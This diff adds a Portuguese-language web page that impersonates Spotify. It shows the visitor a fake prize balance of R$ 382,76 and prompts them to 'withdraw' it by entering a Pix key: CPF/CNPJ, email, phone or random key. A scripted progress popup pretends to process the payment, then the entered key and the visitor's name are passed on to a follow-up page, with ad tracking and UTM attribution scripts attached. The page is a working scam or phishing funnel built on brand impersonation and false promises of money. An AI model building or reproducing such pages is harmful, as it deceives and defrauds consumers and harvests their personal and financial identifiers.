@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Spotify</title>
+
+<script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "uem62uib5t");
+</script>
+
+<!-- Facebook Pixel -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '949313014576281');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1597899204644792&ev=PageView&noscript=1"/></noscript>
+
+<!-- Google Fonts -->
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+<style>
+/* RESET / BASE */
+*{
+  box-sizing:border-box;
+  font-family:'Poppins',sans-serif;
+  color:#fff;
+}
+html,body{
+  margin:0;
+  padding:0;
+  width:100%;
+  min-height:100%;
+  overflow-x:hidden;
+  background:#181818;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+}
+
+/* TOPO */
+#topoFixo{
+  position:fixed;
+  top:0;
+  left:0;
+  width:100%;
+  padding:14px 16px;
+  background:#000;
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  z-index:10;
+}
+#logo{width:130px}
+#saldoatual{
+  background:#07bb34;
+  padding:10px 16px;
+  border-radius:12px;
+  font-weight:600;
+}
+
+/* CARD PRINCIPAL */
+.centralizado{
+  margin-top:84px;
+  width:92%;
+  max-width:400px;
+  background:#000;
+  padding:26px 22px;
+  border-radius:14px;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  text-align:center;
+}
+
+/* TEXTOS */
+#logocentral{width:90px}
+#textoprincipalsptfy{
+  font-size:22px;
+  font-weight:700;
+  margin:20px 0 14px;
+}
+#descricaoiniciospotify{
+  font-size:14px;
+  color:#a8a8a8;
+  margin:10px 0 16px;
+}
+#descricaoiniciospotifyy{
+  font-size:13px;
+  color:#a8a8a8;
+  margin-top:18px;
+  line-height:1.4;
+}
+
+/* NOTIFICAÇÃO */
+#notificacao{
+  width:100%;
+  background:rgba(1,214,97,.4);
+  border:1px solid rgb(1,214,97);
+  border-radius:12px;
+  padding:14px 10px;
+  margin-bottom:18px;
+  font-size:14px;
+}
+#notificacao b{color:#fff}
+
+/* PIX */
+#botaperguntas{
+  width:100%;
+  display:flex;
+  gap:10px;
+  margin:14px 0 12px;
+}
+.opcao-pix{
+  flex:1;
+  background:#6a6a6a;
+  border-radius:12px;
+  padding:12px 6px;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+  font-size:12px;
+  cursor:pointer;
+  transition:.15s;
+}
+.opcao-pix.ativa{
+  background:rgb(1,214,97);
+}
+
+/* INPUT */
+#nomeInput{
+  width:100%;
+  padding:13px 12px;
+  border-radius:8px;
+  border:1px solid #a8a8a8;
+  background:#181818;
+  color:#eaeaea;
+  margin-top:14px;
+}
+#mensagemAjuda{
+  font-size:12px;
+  color:#a8a8a8;
+  margin:8px 0 14px;
+  min-height:18px;
+}
+
+/* BOTÃO */
+#meuBotao{
+  width:100%;
+  padding:14px;
+  border-radius:999px;
+  border:1px solid #6a6a6a;
+  background:#6a6a6a;
+  font-weight:600;
+  margin-top:6px;
+}
+#meuBotao.ativo{
+  background:rgb(1,214,97);
+  border-color:rgb(1,214,97);
+  cursor:pointer;
+}
+</style>
+</head>
+
+<body>
+
+<!-- TOPO -->
+<div id="topoFixo">
+  <img src="images/logo.png" id="logo">
+  <div id="saldoatual">Saldo: R$ 382,76</div>
+</div>
+
+<!-- CARD -->
+<div class="centralizado">
+
+  <img src="images/logowhite.png" id="logocentral">
+
+  <div id="textoprincipalsptfy">
+    Olá, <b id="mensagem">Nome não encontrado!</b>
+  </div>
+
+  <div id="notificacao">
+    Você ganhou <b>R$ 31,59</b><br><br>
+    <b style="font-size:24px;">SALDO: R$ 382,76</b>
+  </div>
+
+  <p id="descricaoiniciospotify">
+    Realize seu <b>PRIMEIRO SAQUE!</b>
+  </p>
+
+  <p style="font-size:14px;">Tipo chave Pix:</p>
+
+  <div id="botaperguntas">
+    <div class="opcao-pix" data-tipo="cpf" onclick="selecionarPix(this)">👤<br>CPF/CNPJ</div>
+    <div class="opcao-pix" data-tipo="email" onclick="selecionarPix(this)">✉️<br>E-MAIL</div>
+    <div class="opcao-pix" data-tipo="aleatoria" onclick="selecionarPix(this)">🎲<br>ALEATÓRIA</div>
+    <div class="opcao-pix" data-tipo="telefone" onclick="selecionarPix(this)">📞<br>TELL</div>
+  </div>
+
+  <input id="nomeInput" placeholder="Selecione o tipo de chave Pix" disabled>
+  <div id="mensagemAjuda"></div>
+
+  <button id="meuBotao" disabled>PREENCHA AS INFORMAÇÕES</button>
+
+<p id="descricaoiniciospotifyy">
+  Este site é protegido pelo reCAPTCHA e está sujeito à
+  <a 
+    href="https://www.spotify.com/br-pt/legal/privacy-policy/" 
+    target="_blank"
+    rel="noopener noreferrer"
+    style="color:rgb(1,214,97); font-weight:500; text-decoration:none;"
+  >
+    Política de Privacidade
+  </a>
+  e aos
+  <a 
+    href="https://policies.google.com/terms?hl=pt-BR" 
+    target="_blank"
+    rel="noopener noreferrer"
+    style="color:rgb(1,214,97); font-weight:500; text-decoration:none;"
+  >
+    Termos de Serviço do Google
+  </a>.
+</p>
+
+
+</div>
+
+<!-- SCRIPT -->
+<script>
+    const params = new URLSearchParams(window.location.search);
+const nomeParam = params.get("nome");
+
+if(nomeParam){
+  document.getElementById("mensagem").innerText = decodeURIComponent(nomeParam.replace(/\+/g, ' '));
+}else{
+  document.getElementById("mensagem").innerText = "visitante";
+}
+let tipoPix=null;
+const input=document.getElementById('nomeInput');
+const botao=document.getElementById('meuBotao');
+const ajuda=document.getElementById('mensagemAjuda');
+
+const placeholders={
+  cpf:"Digite seu CPF ou CNPJ",
+  email:"Digite seu e-mail Pix",
+  aleatoria:"Digite sua chave aleatória",
+  telefone:"Digite seu telefone com DDD"
+};
+const mensagens={
+  cpf:"Chaves CPF/CNPJ têm prioridade no processamento.",
+  email:"Chaves por e-mail podem levar até 1 minuto.",
+  aleatoria:"Recomendado por segurança.",
+  telefone:"Número deve estar vinculado ao Pix."
+};
+
+function selecionarPix(el){
+  document.querySelectorAll('.opcao-pix').forEach(b=>b.classList.remove('ativa'));
+  el.classList.add('ativa');
+  tipoPix=el.dataset.tipo;
+  input.disabled=false;
+  input.placeholder=placeholders[tipoPix];
+  ajuda.innerText=mensagens[tipoPix];
+  validar();
+}
+
+input.addEventListener('input',validar);
+
+function validar(){
+  if(tipoPix && input.value.trim().length>3){
+    botao.classList.add('ativo');
+    botao.disabled=false;
+    botao.innerText="REALIZAR SAQUE VIA PIX";
+    botao.onclick = redirecionarProximoPasso; // 🔑 AQUI
+  }else{
+    botao.classList.remove('ativo');
+    botao.disabled=true;
+    botao.innerText="PREENCHA AS INFORMAÇÕES";
+    botao.onclick = null;
+  }
+}
+
+function redirecionarProximoPasso(){
+  const popup = document.getElementById('popupProcessamento');
+  const texto = document.getElementById('textoProcessamento');
+  const barra = document.getElementById('barraProg');
+
+  popup.style.display="flex";
+
+  const etapas = [
+    {t:"Validando dados…", p:30},
+    {t:"Transferindo para sistema Pix…", p:65},
+    {t:"Processando pagamento…", p:100}
+  ];
+
+  let i=0;
+  const anim = setInterval(()=>{
+    texto.innerText = etapas[i].t;
+    barra.style.width = etapas[i].p+"%";
+    i++;
+    if(i>=etapas.length) clearInterval(anim);
+  },1400);
+
+  setTimeout(()=>{
+    const params = new URLSearchParams(window.location.search);
+    const nome = params.get("nome");
+    const pix = input.value.trim();
+
+    const utmParams = ['utm_source','utm_medium','utm_campaign','utm_term','utm_content']
+      .map(p=>{
+        const v = localStorage.getItem(p);
+        return v ? `${p}=${encodeURIComponent(v)}` : '';
+      })
+      .filter(Boolean)
+      .join('&');
+
+    let urlDestino = `../status/?`;
+    if(nome) urlDestino += `nome=${encodeURIComponent(nome)}&`;
+    urlDestino += `pix=${encodeURIComponent(pix)}`;
+    if(utmParams) urlDestino += `&${utmParams}`;
+
+    window.location.href = urlDestino;
+  },4800);
+}
+</script>
+
+
+
+<!-- UTMFY (MANTIDO NO FINAL) -->
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer>
+</script>
+
+<!-- POPUP PROCESSAMENTO -->
+<div id="popupProcessamento">
+  <div class="popupBox">
+    <div class="loader"></div>
+    <div id="textoProcessamento">Validando dados…</div>
+    <div class="barra">
+      <span id="barraProg"></span>
+    </div>
+  </div>
+</div>
+
+<style>
+#popupProcessamento{
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,.9);
+  display:none;
+  align-items:center;
+  justify-content:center;
+  z-index:9999;
+}
+.popupBox{
+  background:#0c0c0c;
+  border:1px solid #1f1f1f;
+  border-radius:16px;
+  padding:26px 22px;
+  width:90%;
+  max-width:340px;
+  text-align:center;
+}
+.loader{
+  width:52px;
+  height:52px;
+  border:4px solid #333;
+  border-top:4px solid rgb(1,214,97);
+  border-radius:50%;
+  margin:0 auto 16px;
+  animation:spin 1s linear infinite;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+#textoProcessamento{
+  font-size:15px;
+  margin-bottom:14px;
+}
+.barra{
+  width:100%;
+  height:8px;
+  background:#1f1f1f;
+  border-radius:999px;
+  overflow:hidden;
+}
+.barra span{
+  display:block;
+  height:100%;
+  width:0%;
+  background:rgb(1,214,97);
+  transition:width .4s;
+}
+</style>
+
+
+</body>
+</html>
